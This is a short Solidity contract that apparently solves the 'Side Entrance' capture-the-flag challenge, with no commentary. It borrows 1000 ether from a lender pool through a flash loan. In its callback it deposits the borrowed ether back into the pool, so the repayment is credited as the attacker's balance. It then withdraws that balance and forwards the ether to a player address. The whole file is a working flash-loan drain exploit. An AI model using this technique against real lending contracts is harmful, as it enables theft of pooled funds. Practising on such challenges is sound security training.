// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract testFlashloanSideEntranceLenderPool {
    address public SideEntranceLenderPool;
    address player;

    constructor(address _SideEntranceLenderPool, address _player) {
        SideEntranceLenderPool = _SideEntranceLenderPool;
        player = _player;
    }

    function start() external {
        SideEntranceLenderPool.call(
            abi.encodeWithSignature("flashLoan(uint256)", 1000e18)
        );
    }

    function end() external {
        SideEntranceLenderPool.call(abi.encodeWithSignature("withdraw()"));
        player.call{value: 1000e18}("");
    }

    function execute() external payable {
        SideEntranceLenderPool.call{value: 1000e18}(
            abi.encodeWithSignature("deposit()")
        );
    }

    receive() external payable {}
}
